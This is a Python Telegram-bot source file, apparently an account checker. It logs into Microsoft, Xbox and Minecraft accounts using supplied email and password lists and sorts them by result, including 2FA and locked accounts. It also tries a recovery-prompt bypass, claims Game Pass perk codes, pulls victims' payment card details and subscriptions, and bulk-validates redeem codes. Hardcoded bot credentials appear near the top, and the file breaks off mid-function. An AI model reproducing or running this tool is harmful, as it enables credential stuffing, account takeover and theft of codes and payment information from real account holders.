import os
import sys
import json
import uuid
import re
import time
import asyncio
import zipfile
import shutil
from datetime import datetime, timedelta
from pathlib import Path
from threading import Lock
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote, unquote, parse_qs, urlparse
from typing import Dict, List, Optional, Tuple
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Pyrofork imports
from pyrogram import Client, filters, types
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from pyrogram.enums import ParseMode
import requests
import aiohttp

# ===========================================================================
# CONFIGURATION
# ============================================================================
API_ID = 23933044
API_HASH = "6df11147cbec7d62a323f0f498c8c03a"
BOT_TOKEN = "8623187143:AAF0M6zKS4Yjipm8hux4qzOA-YrN7-v7gsg"

# Update interval in seconds (increased to 3 to avoid flood)
UPDATE_INTERVAL = 3

# Colors for console
class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; C = '\033[96m'; W = '\033[97m'; GR = '\033[90m'
    BOLD = '\033[1m'; END = '\033[0m'

# Bot directories
BASE_DIR = Path("bot_data")
USERS_DIR = BASE_DIR / "users"
RESULTS_DIR = BASE_DIR / "results"
WLID_DIR = BASE_DIR / "wlids"

# Create directories
BASE_DIR.mkdir(exist_ok=True)
USERS_DIR.mkdir(exist_ok=True)
RESULTS_DIR.mkdir(exist_ok=True)
WLID_DIR.mkdir(exist_ok=True)

# ============================================================================
# MICROSOFT AUTHENTICATOR FOR WLID
# ============================================================================

class CookieJar:
    """Manages cookies across redirects"""
    def __init__(self):
        self.cookies: Dict[str, str] = {}
    
    def extract_from_headers(self, headers: dict):
        """Extract cookies from response headers"""
        set_cookie = headers.get('Set-Cookie', '')
        if not set_cookie:
            return
        
        cookies = re.split(r',(?=\s*[^;,]+=[^;,]+)', set_cookie)
        for cookie in cookies:
            parts = cookie.split(';')[0].strip()
            if '=' in parts:
                name, value = parts.split('=', 1)
                name = name.strip()
                value = value.strip()
                if name and value:
                    self.cookies[name] = value
    
    def to_string(self) -> str:
        return '; '.join([f"{k}={v}" for k, v in self.cookies.items()])
    
    def update_from_response(self, response: requests.Response):
        """Extract cookies from requests Response object"""
        if 'Set-Cookie' in response.headers:
            self.extract_from_headers(response.headers)
        for cookie in response.cookies:
            self.cookies[cookie.name] = cookie.value

class MicrosoftAuthenticator:
    """Handles Microsoft account authentication flow for WLID generation"""
    
    DEFAULT_HEADERS = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
    }
    
    TOKEN_HEADERS = {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
    }

    def __init__(self):
        self.patterns = {
            'sftTag': re.compile(r'value=\\?"([^"\\]+)\\?"', re.DOTALL),
            'urlPost': re.compile(r'"urlPost":"([^"]+)"', re.DOTALL),
            'urlPostAlt': re.compile(r"urlPost:'([^']+)'", re.DOTALL),
            'urlGoToAad': re.compile(r'urlGoToAADError":"([^"]+)"', re.DOTALL),
            'sftToken': re.compile(r'"sFT":"([^"]+)"', re.DOTALL),
            'formAction': re.compile(r'<form[^>]*action="([^"]+)"', re.DOTALL),
            'hiddenInputs': re.compile(r'<input[^>]+type="hidden"[^>]+name="([^"]+)"[^>]+value="([^"]*)"', re.DOTALL),
            'redirectUrl': re.compile(r"ucis\.RedirectUrl\s*=\s*'([^']+)'", re.DOTALL),
            'replaceUrl': re.compile(r'replace\("([^"]+)"\)', re.DOTALL),
            'formInputs': re.compile(r'<input[^>]+name="([^"]+)"[^>]+value="([^"]*)"', re.DOTALL),
        }

    @staticmethod
    def decode_json_string(text: str) -> str:
        try:
            return json.loads(f'"{text}"')
        except:
            return text

    def extract_pattern(self, text: str, pattern_name: str) -> Optional[str]:
        pattern = self.patterns.get(pattern_name)
        if not pattern:
            return None
        match = pattern.search(text)
        return match.group(1) if match else None

    def extract_all_matches(self, text: str, pattern_name: str) -> List[Tuple[str, str]]:
        pattern = self.patterns.get(pattern_name)
        if not pattern:
            return []
        return pattern.findall(text)

    def fetch_with_cookies(self, method: str, url: str, headers: dict = None, 
                          data: dict = None, cookies: CookieJar = None, 
                          allow_redirects: bool = False) -> Tuple[requests.Response, str, str]:
        """Make request with manual redirect handling and cookie tracking"""
        session = requests.Session()
        current_url = url
        max_redirects = 10
        
        req_headers = {**self.DEFAULT_HEADERS}
        if headers:
            req_headers.update(headers)
        if cookies:
            req_headers['Cookie'] = cookies.to_string()
        
        while max_redirects > 0:
            try:
                if method.upper() == 'GET':
                    resp = session.get(current_url, headers=req_headers, 
                                     allow_redirects=False, timeout=30)
                else:
                    resp = session.post(current_url, headers=req_headers, 
                                      data=data, allow_redirects=False, timeout=30)
                
                if cookies:
                    cookies.update_from_response(resp)
                
                location = resp.headers.get('Location') or resp.headers.get('location')
                if resp.status_code >= 300 and resp.status_code < 400 and location:
                    if location.startswith('/'):
                        parsed = urlparse(current_url)
                        current_url = f"{parsed.scheme}://{parsed.netloc}{location}"
                    elif not location.startswith('http'):
                        parsed = urlparse(current_url)
                        current_url = f"{parsed.scheme}://{parsed.netloc}/{location}"
                    else:
                        current_url = location
                    
                    max_redirects -= 1
                    method = 'GET'
                    data = None
                    req_headers.pop('Content-Type', None)
                    if cookies:
                        req_headers['Cookie'] = cookies.to_string()
                    continue
                
                return resp, resp.text, current_url
                
            except Exception as e:
                raise Exception(f"Request failed: {str(e)}")
        
        raise Exception("Too many redirects")

    def authenticate(self, email: str, password: str) -> dict:
        """Full authentication flow to get WLID token"""
        cookies = CookieJar()
        result = {
            'email': email,
            'success': False,
            'token': None,
            'error': None,
            'display': None
        }
        
        try:
            # Step 1: Initial request
            resp, text, final_url = self.fetch_with_cookies(
                'GET', "https://account.microsoft.com/billing/redeem",
                cookies=cookies
            )

            # Step 2: Extract redirect URL
            rurl_match = self.extract_pattern(text, 'urlPost')
            if not rurl_match:
                result['error'] = "Could not extract redirect URL"
                return result
            
            rurl = "https://login.microsoftonline.com" + self.decode_json_string(rurl_match)
            
            resp, text, _ = self.fetch_with_cookies(
                'GET', rurl, 
                headers={'Referer': 'https://account.microsoft.com/'},
                cookies=cookies
            )

            # Step 3: Extract AAD URL
            furl_match = self.extract_pattern(text, 'urlGoToAad')
            if not furl_match:
                result['error'] = "Could not extract AAD URL"
                return result
            
            furl = self.decode_json_string(furl_match)
            furl = furl.replace(
                '&jshs=0',
                f'&jshs=2&jsh=&jshp=&username={requests.utils.quote(email)}&login_hint={requests.utils.quote(email)}'
            )

            # Step 4: Get sFT tag and urlPost
            resp, text, _ = self.fetch_with_cookies(
                'GET', furl,
                headers={'Referer': 'https://login.microsoftonline.com/'},
                cookies=cookies
            )

            # Extract sFT tag (PPFT)
            sft_tag = self.extract_pattern(text, 'sftTag')
            if not sft_tag:
                sft_tag = self.extract_pattern(text.replace('\\', ''), 'sftTag')
            
            if not sft_tag:
                ppft_match = re.search(r'name="PPFT"[^>]+value="([^"]+)"', text)
                if ppft_match:
                    sft_tag = ppft_match.group(1)
            
            if not sft_tag:
                ppft_match = re.search(r'value="([^"]+)"[^>]+name="PPFT"', text)
                if ppft_match:
                    sft_tag = ppft_match.group(1)

            if not sft_tag:
                result['error'] = "Could not extract session token (PPFT)"
                return result

            url_post = self.extract_pattern(text, 'urlPost') or self.extract_pattern(text, 'urlPostAlt')
            if not url_post:
                result['error'] = "Could not extract submission URL"
                return result

            # Step 5: Submit credentials
            login_data = {
                'login': email,
                'loginfmt': email,
                'passwd': password,
                'PPFT': sft_tag
            }
            
            resp, login_text, _ = self.fetch_with_cookies(
                'POST', url_post,
                headers={
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Referer': furl,
                    'Origin': 'https://login.live.com'
                },
                data=login_data,
                cookies=cookies
            )
            
            login_text_clean = login_text.replace('\\', '')
            
            # Check for errors
            if 'Your account or password is incorrect' in login_text or 'sErrTxt' in login_text:
                result['error'] = "Invalid credentials"
                return result

            # Step 6: Extract second sFT token
            ppft_match = self.extract_pattern(login_text_clean, 'sftToken')
            
            # Handle privacy notice if needed
            if not ppft_match:
                action_url = self.extract_pattern(login_text_clean, 'formAction')
                if action_url and 'privacynotice' in action_url:
                    input_matches = self.extract_all_matches(login_text_clean, 'hiddenInputs')
                    if input_matches:
                        form_data = {name: value for name, value in input_matches}
                        resp, interstitial_text, _ = self.fetch_with_cookies(
                            'POST', action_url,
                            headers={'Content-Type': 'application/x-www-form-urlencoded'},
                            data=form_data,
                            cookies=cookies
                        )
                        
                        redirect_match = self.extract_pattern(interstitial_text, 'redirectUrl')
                        if redirect_match:
                            redirect_url = redirect_match.replace('u0026', '&').replace('\\&', '&')
                            resp, login_text_clean, _ = self.fetch_with_cookies(
                                'GET', redirect_url, cookies=cookies
                            )
                            login_text_clean = login_text_clean.replace('\\', '')
                            ppft_match = self.extract_pattern(login_text_clean, 'sftToken')

            if not ppft_match:
                result['error'] = "Secondary authentication failed"
                return result

            # Step 7: Final login submission
            lurl_match = self.extract_pattern(login_text_clean, 'urlPost')
            if not lurl_match:
                result['error'] = "Could not finalize authentication URL"
                return result
            
            final_login_data = {
                'LoginOptions': '1',
                'type': '28',
                'ctx': '',
                'hpgrequestid': '',
                'PPFT': ppft_match,
                'canary': ''
            }
            
            resp, finish_text, _ = self.fetch_with_cookies(
                'POST', lurl_match,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                data=final_login_data,
                cookies=cookies
            )

            # Step 8: Handle final redirect
            reurl_match = self.extract_pattern(finish_text, 'replaceUrl')
            reresp = finish_text
            
            if reurl_match:
                resp, reresp, _ = self.fetch_with_cookies(
                    'GET', reurl_match,
                    headers={'Referer': 'https://login.live.com/'},
                    cookies=cookies
                )

            # Step 9: Final form if present
            final_action = self.extract_pattern(reresp, 'formAction')
            if final_action and 'javascript' not in final_action:
                inputs = self.extract_all_matches(reresp, 'formInputs')
                if inputs:
                    form_data = {name: value for name, value in inputs}
                    self.fetch_with_cookies(
                        'POST', final_action,
                        headers={'Content-Type': 'application/x-www-form-urlencoded'},
                        data=form_data,
                        cookies=cookies
                    )

            # Step 10: Get authentication token
            token_url = 'https://account.microsoft.com/auth/acquire-onbehalf-of-token?scopes=MSComServiceMBISSL'
            headers = {
                **self.TOKEN_HEADERS,
                'User-Agent': self.DEFAULT_HEADERS['User-Agent'],
                'Referer': 'https://account.microsoft.com/billing/redeem',
                'Cookie': cookies.to_string()
            }
            
            token_resp = requests.get(token_url, headers=headers, timeout=30)
            try:
                token_data = token_resp.json()
                if isinstance(token_data, list) and len(token_data) > 0 and token_data[0].get('token'):
                    token = token_data[0]['token']
                    result['success'] = True
                    result['token'] = token
                    result['display'] = token
                    return result
                else:
                    result['error'] = "Invalid token structure received"
                    return result
            except:
                result['error'] = "Failed to parse token response"
                return result

        except Exception as e:
            result['error'] = str(e)
            return result

# ============================================================================
# CODE CHECKER (Async)
# ============================================================================

class CodeStatus:
    VALID = "valid"
    USED = "used"
    EXPIRED = "expired"
    INVALID = "invalid"
    ERROR = "error"

class CodeChecker:
    MAX_PER_WLID = 40
    
    def __init__(self, wlids: list, threads: int = 10):
        self.wlids = [self._format_wlid(w) for w in wlids if w.strip()]
        self.threads = min(threads, 100)
        self.title_cache = {}
    
    def _format_wlid(self, wlid: str) -> str:
        wlid = wlid.strip()
        if "WLID1.0=" not in wlid:
            return f'WLID1.0="{wlid}"'
        return wlid
    
    async def _fetch_title(self, session, product_id: str, sku_id: str) -> str:
        if product_id in self.title_cache:
            return self.title_cache[product_id]
        
        try:
            url = f"https://displaycatalog.mp.microsoft.com/v7.0/products?bigIds={product_id}&market=US&languages=en-US"
            async with session.get(url) as resp:
                if resp.status != 200:
                    return f"ID: {product_id}"
                data = await resp.json()
                if not data.get("Products"):
                    return f"ID: {product_id}"
                
                product = data["Products"][0]
                title = None
                
                if product.get("DisplaySkuAvailabilities"):
                    for sku in product["DisplaySkuAvailabilities"]:
                        if sku.get("Sku", {}).get("SkuId") == sku_id:
                            loc = sku.get("Sku", {}).get("LocalizedProperties", [])
                            if loc:
                                title = loc[0].get("SkuTitle") or loc[0].get("SkuDescription")
                                break
                
                if not title and product.get("LocalizedProperties"):
                    title = product["LocalizedProperties"][0].get("ProductTitle")
                
                if title:
                    self.title_cache[product_id] = title
                    return title
                return f"ID: {product_id}"
        except Exception as e:
            return f"ID: {product_id}"
    
    async def _check_code(self, session, code: str, wlid: str) -> dict:
        code = code.strip()
        if not code or len(code) < 18:
            return {'code': code, 'status': CodeStatus.INVALID}
        
        headers = {
            "Authorization": wlid,
            "Accept": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Origin": "https://www.microsoft.com",
            "Referer": "https://www.microsoft.com/",
        }
        url = f"https://purchase.mp.microsoft.com/v7.0/tokenDescriptions/{code}?market=US&language=en-US&supportMultiAvailabilities=true"
        
        for attempt in range(3):
            try:
                async with session.get(url, headers=headers, timeout=30) as resp:
                    if resp.status == 429:
                        await asyncio.sleep(5)
                        continue
                    
                    data = await resp.json()
                    title = "N/A"
                    
                    if data.get("products"):
                        p = data["products"][0]
                        title = p.get("sku", {}).get("title") or p.get("title", "N/A")
                    elif data.get("universalStoreBigIds"):
                        parts = data["universalStoreBigIds"][0].split("/")
                        title = await self._fetch_title(session, parts[0], parts[1] if len(parts) > 1 else "")
                    
                    state = data.get("tokenState", "")
                    if state == "Active":
                        return {'code': code, 'status': CodeStatus.VALID, 'title': title, 'raw_response': data}
                    elif state == "Redeemed":
                        return {'code': code, 'status': CodeStatus.USED, 'title': title, 'raw_response': data}
                    elif state == "Expired":
                        return {'code': code, 'status': CodeStatus.EXPIRED, 'title': title, 'raw_response': data}
                    elif data.get("code") == "Unauthorized":
                        return {'code': code, 'status': CodeStatus.ERROR, 'error': "WLID unauthorized"}
                    return {'code': code, 'status': CodeStatus.INVALID}
            except Exception as e:
                if attempt < 2:
                    await asyncio.sleep(1)
                else:
                    return {'code': code, 'status': CodeStatus.ERROR, 'error': str(e)}
        
        return {'code': code, 'status': CodeStatus.ERROR, 'error': "Max retries exceeded"}
    
    async def check_all(self, codes: list, progress_callback=None):
        tasks = []
        valid_codes = [c.strip() for c in codes if c.strip()]
        
        for i, code in enumerate(valid_codes):
            wlid_idx = i // self.MAX_PER_WLID
            if wlid_idx >= len(self.wlids):
                break
            tasks.append((code, self.wlids[wlid_idx]))
        
        semaphore = asyncio.Semaphore(self.threads)
        results = []
        total = len(tasks)
        
        async def check_with_progress(code, wlid, index):
            async with semaphore:
                async with aiohttp.ClientSession() as session:
                    result = await self._check_code(session, code, wlid)
                    if progress_callback:
                        progress_callback(index + 1, total, result)
                    return result
        
        futures = [check_with_progress(c, w, i) for i, (c, w) in enumerate(tasks)]
        results = await asyncio.gather(*futures)
        return results

def run_code_checker(wlids: list, codes: list, threads: int, progress_callback=None):
    checker = CodeChecker(wlids, threads)
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(checker.check_all(codes, progress_callback))
    finally:
        loop.close()

# ============================================================================
# MODULE 1: XBOX FLOW
# ============================================================================
XBOX_RPS_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

class XboxModule:
    """Xbox Token Flow: RPS → User Token → XSTS → MC Token / Codes"""
    
    def __init__(self):
        pass
    
    def get_rps_token(self, session, email, password):
        """Step 1: Get Xbox RPS Token"""
        try:
            # Get PPFT and urlPost
            r = session.get(XBOX_RPS_URL, timeout=15)
            ppft = None
            url_post = None
            
            for pattern in [r'value="([^"]+)"', r'sFTTag.*?value=\\"([^"\\]+)\\"']:
                m = re.search(pattern, r.text)
                if m: ppft = m.group(1); break
            
            for pattern in [r"urlPost:'([^']+)'", r'"urlPost"\s*:\s*"([^"]+)"']:
                m = re.search(pattern, r.text)
                if m: url_post = m.group(1).replace('\\/', '/'); break
            
            if not ppft or not url_post:
                return None, "PARSE_ERROR"
            
            # Login
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft}
            r2 = session.post(url_post, data=data, allow_redirects=True, timeout=20)
            
            # Check response
            if '#' in r2.url and r2.url != XBOX_RPS_URL:
                token = parse_qs(urlparse(r2.url).fragment).get('access_token', [None])[0]
                if token:
                    return token, "OK"
            
            # Recovery cancel bypass
            if 'cancel?mkt=' in r2.text:
                try:
                    ipt = re.search(r'"ipt" value="([^"]+)"', r2.text).group(1)
                    pprid = re.search(r'"pprid" value="([^"]+)"', r2.text).group(1)
                    uaid = re.search(r'"uaid" value="([^"]+)"', r2.text).group(1)
                    action = re.search(r'id="fmHF" action="([^"]+)"', r2.text).group(1)
                    
                    ret = session.post(action, data={'ipt': ipt, 'pprid': pprid, 'uaid': uaid}, allow_redirects=True)
                    return_url = re.search(r'"recoveryCancel":\{"returnUrl":"([^"]+)"', ret.text)
                    if return_url:
                        fin = session.get(return_url.group(1).replace('\\u0026', '&'), allow_redirects=True)
                        token = parse_qs(urlparse(fin.url).fragment).get('access_token', [None])[0]
                        if token: return token, "OK"
                except: pass
            
            # Error detection
            txt = r2.text.lower()
            if any(x in r2.text for x in ["recover?mkt", "identity/confirm?mkt", "Email/Confirm?mkt"]):
                return None, "2FA"
            if "/Abuse?mkt=" in r2.text:
                return None, "LOCKED"
            if "password is incorrect" in txt or "account doesn\\'t exist" in txt:
                return None, "BAD"
            
            return None, "BAD"
        except Exception as e:
            return None, "ERROR"
    
    def get_xbox_tokens(self, session, rps_token):
        """Step 2: RPS → Xbox User Token → XSTS Token"""
        try:
            # Xbox User Token
            r1 = session.post(
                'https://user.auth.xboxlive.com/user/authenticate',
                json={
                    "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": rps_token},
                    "RelyingParty": "http://auth.xboxlive.com",
                    "TokenType": "JWT"
                },
                headers={'Content-Type': 'application/json'},
                timeout=20
            )
            
            if r1.status_code != 200:
                return None, None, None
            
            data = r1.json()
            user_token = data.get('Token')
            uhs = data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
            
            if not user_token or not uhs:
                return None, None, None
            
            # XSTS Token (for Minecraft)
            r2 = session.post(
                'https://xsts.auth.xboxlive.com/xsts/authorize',
                json={
                    "Properties": {"SandboxId": "RETAIL", "UserTokens": [user_token]},
                    "RelyingParty": "rp://api.minecraftservices.com/",
                    "TokenType": "JWT"
                },
                headers={'Content-Type': 'application/json'},
                timeout=20
            )
            
            xsts_mc = r2.json().get('Token') if r2.status_code == 200 else None
            
            # XSTS Token (for Xbox Live / Codes)
            r3 = session.post(
                'https://xsts.auth.xboxlive.com/xsts/authorize',
                json={
                    "Properties": {"SandboxId": "RETAIL", "UserTokens": [user_token]},
                    "RelyingParty": "http://xboxlive.com",
                    "TokenType": "JWT"
                },
                headers={'Content-Type': 'application/json'},
                timeout=20
            )
            
            xsts_xbox = r3.json().get('Token') if r3.status_code == 200 else None
            
            return uhs, xsts_mc, xsts_xbox
            
        except:
            return None, None, None
    
    def get_minecraft_token(self, session, uhs, xsts_token):
        """Step 3: XSTS → Minecraft Token"""
        try:
            r = session.post(
                'https://api.minecraftservices.com/authentication/login_with_xbox',
                json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                headers={'Content-Type': 'application/json'},
                timeout=15
            )
            if r.status_code == 200:
                return r.json().get('access_token')
        except: pass
        return None
    
    def check_minecraft(self, session, mc_token):
        """Check Minecraft ownership and profile"""
        result = {'has_mc': False, 'has_gp': False, 'gp_type': None, 'name': None, 'uuid': None, 'capes': None}
        try:
            # Entitlements
            r = session.get(
                'https://api.minecraftservices.com/entitlements/mcstore',
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=10
            )
            if r.status_code == 200:
                txt = r.text
                if 'product_game_pass_ultimate' in txt:
                    result['has_gp'] = True
                    result['gp_type'] = 'Xbox Game Pass Ultimate'
                elif 'product_game_pass_pc' in txt:
                    result['has_gp'] = True
                    result['gp_type'] = 'PC Game Pass'
                if '"product_minecraft"' in txt:
                    result['has_mc'] = True
            
            # Profile
            if result['has_mc'] or result['has_gp']:
                r2 = session.get(
                    'https://api.minecraftservices.com/minecraft/profile',
                    headers={'Authorization': f'Bearer {mc_token}'},
                    timeout=10
                )
                if r2.status_code == 200:
                    data = r2.json()
                    result['name'] = data.get('name')
                    result['uuid'] = data.get('id')
                    capes = data.get('capes', [])
                    if capes:
                        result['capes'] = ', '.join([c.get('alias', '') for c in capes])
        except: pass
        return result
    
    def fetch_xbox_codes(self, session, uhs, xsts_token):
        """Fetch Xbox Game Pass perks/codes"""
        codes = []
        try:
            auth = f'XBL3.0 x={uhs};{xsts_token}'
            
            # Get offers list
            r = session.get(
                'https://profile.gamepass.com/v2/offers',
                headers={'Authorization': auth, 'Content-Type': 'application/json', 'User-Agent': 'okhttp/4.12.0'},
                timeout=30
            )
            
            if r.status_code != 200:
                return codes
            
            data = r.json()
            offers = data.get('offers', [])
            available = [o for o in offers if o.get('offerStatus') == 'available']
            
            # Claim each available offer
            for offer in available:
                try:
                    offer_id = offer.get('offerId')
                    r2 = session.post(
                        f'https://profile.gamepass.com/v2/offers/{offer_id}',
                        headers={'Authorization': auth, 'Content-Type': 'application/json', 'User-Agent': 'okhttp/4.12.0'},
                        data='',
                        timeout=20
                    )
                    
                    if r2.status_code == 200:
                        code = r2.json().get('resource')
                        if code:
                            codes.append({
                                'code': code,
                                'title': 'Xbox Perk',
                                'offer_id': offer_id,
                                'type': self._categorize_code(code)
                            })
                except: continue
                
        except: pass
        return codes
    
    def _categorize_code(self, code):
        """Categorize code type"""
        if re.match(r'^[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}$', code.upper()):
            return 'XBOX_CODE'
        if 'discord' in code.lower():
            return 'DISCORD'
        return 'OTHER'


# ============================================================================
# MODULE 2: MICROSOFT FLOW
# ============================================================================
class MicrosoftModule:
    """Microsoft Direct Flow: OAuth → Payment Token → APIs"""
    
    def get_outlook_token(self, session, email, password):
        """Get Microsoft token via Outlook OAuth flow"""
        try:
            # IDP Check
            r1 = session.get(
                f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}",
                headers={"User-Agent": "Outlook-Android/2.0"},
                timeout=15
            )
            
            if "MSAccount" not in r1.text:
                return None, "NOT_MSA"
            
            # OAuth authorize
            oauth_url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            
            r2 = session.get(oauth_url, timeout=15)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            
            if not url_match or not ppft_match:
                return None, "PARSE_ERROR"
            
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            # Login POST
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&NewUser=1"
            
            r3 = session.post(
                post_url,
                data=login_data,
                headers={'Content-Type': 'application/x-www-form-urlencoded', 'Referer': r2.url},
                allow_redirects=False,
                timeout=15
            )
            
            # Check errors
            if "password is incorrect" in r3.text or r3.text.count("error") > 0:
                return None, "BAD"
            if "identity/confirm" in r3.text:
                return None, "2FA"
            if "/Abuse" in r3.text:
                return None, "LOCKED"
            
            # Get code from redirect
            location = r3.headers.get("Location", "")
            code_match = re.search(r'code=([^&]+)', location)
            
            if not code_match:
                return None, "NO_CODE"
            
            code = code_match.group(1)
            
            # Exchange code for token
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            
            r4 = session.post(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data=token_data,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                timeout=15
            )
            
            if "access_token" in r4.text:
                return r4.json().get("access_token"), "OK"
            
            return None, "TOKEN_ERROR"
            
        except Exception as e:
            return None, "ERROR"
    
    def get_payment_token(self, session):
        """Get payment delegate token"""
        try:
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            
            url = f"https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state={quote(state)}&prompt=none"
            
            r = session.get(url, allow_redirects=True, timeout=20)
            
            for pattern in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
                m = re.search(pattern, r.text + ' ' + r.url)
                if m:
                    return unquote(m.group(1))
            
        except: pass
        return None
    
    def get_rewards_points(self, session):
        """Get Bing Rewards points"""
        try:
            r = session.get('https://rewards.bing.com/', timeout=10, allow_redirects=True)
            m = re.search(r'"availablePoints"\s*:\s*(\d+)', r.text)
            if m:
                return int(m.group(1))
        except: pass
        return 0
    
    def get_subscriptions(self, session, payment_token):
        """Get ACTIVE subscriptions only (days > 0)"""
        subs = []
        try:
            headers = {
                "Authorization": f'MSADELEGATE1.0="{payment_token}"',
                "Accept": "application/json",
                "ms-cV": str(uuid.uuid4())
            }
            
            r = session.get(
                "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/PaymentTransactionInfo/recurring?language=en-US",
                headers=headers, timeout=15
            )
            
            if r.status_code == 200:
                data = r.json()
                items = data.get('recurringBillings', data.get('items', []))
                
                for item in items:
                    renewal = item.get('nextRenewalDate') or item.get('renewalDate')
                    if renewal:
                        try:
                            renewal_date = datetime.fromisoformat(renewal.replace('Z', '+00:00'))
                            days = (renewal_date - datetime.now(renewal_date.tzinfo)).days
                            
                            # ONLY ACTIVE (days > 0)
                            if days > 0:
                                title = item.get('title') or item.get('productTitle', 'Unknown')
                                subs.append({
                                    'title': title,
                                    'days': days,
                                    'auto_renew': 'YES' if item.get('autoRenew') else 'NO',
                                    'type': self._categorize_sub(title)
                                })
                        except: continue
        except: pass
        return subs
    
    def get_payment_info(self, session, payment_token):
        """Get payment card info"""
        info = {'card_type': None, 'last4': None, 'holder': None, 'balance': 0, 'country': None}
        try:
            headers = {
                "Authorization": f'MSADELEGATE1.0="{payment_token}"',
                "Accept": "application/json"
            }
            
            r = session.get(
                "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active&language=en-US",
                headers=headers, timeout=15
            )
            
            if r.status_code == 200:
                data = r.json()
                items = data.get('paymentInstruments', data.get('items', []))
                
                for item in items:
                    if item.get('paymentMethodFamily') == 'credit_card':
                        info['card_type'] = item.get('paymentMethodType', 'Card')
                        info['last4'] = item.get('lastFourDigits')
                        bp = item.get('billingProfile', {})
                        info['holder'] = f"{bp.get('firstName', '')} {bp.get('lastName', '')}".strip()
                        addr = bp.get('billingAddress', {})
                        info['country'] = addr.get('country')
                        break
                
                # Balance
                m = re.search(r'"balance"\s*:\s*([0-9.]+)', r.text)
                if m:
                    info['balance'] = float(m.group(1))
        except: pass
        return info
    
    def _categorize_sub(self, title):
        """Categorize subscription type"""
        t = title.lower()
        if 'game pass ultimate' in t: return 'GPU'
        if 'pc game pass' in t: return 'PC_GP'
        if 'game pass core' in t or 'xbox live gold' in t: return 'CORE'
        if 'ea play' in t: return 'EA_PLAY'
        if 'fortnite' in t: return 'FORTNITE'
        if 'discord' in t: return 'DISCORD'
        if 'microsoft 365' in t or 'office 365' in t: return 'M365'
        if 'minecraft' in t: return 'MINECRAFT'
        return 'OTHER'


# ============================================================================
# FULL CHECKER CLASS
# ============================================================================
class FullChecker:
    def __init__(self):
        self.xbox = XboxModule()
        self.ms = MicrosoftModule()
    
    def check(self, email, password):
        """Full check using both modules"""
        result = {
            'email': email,
            'password': password,
            'status': 'BAD',
            'minecraft': None,
            'xbox_codes': [],
            'subscriptions': [],
            'rewards': 0,
            'payment': None
        }
        
        session = requests.Session()
        session.verify = False
        session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        
        try:
            # ===== MODULE 1: XBOX FLOW =====
            rps_token, status = self.xbox.get_rps_token(session, email, password)
            
            if status != "OK":
                result['status'] = status
                return result
            
            # Get Xbox tokens
            uhs, xsts_mc, xsts_xbox = self.xbox.get_xbox_tokens(session, rps_token)
            
            # Minecraft check
            if xsts_mc:
                mc_token = self.xbox.get_minecraft_token(session, uhs, xsts_mc)
                if mc_token:
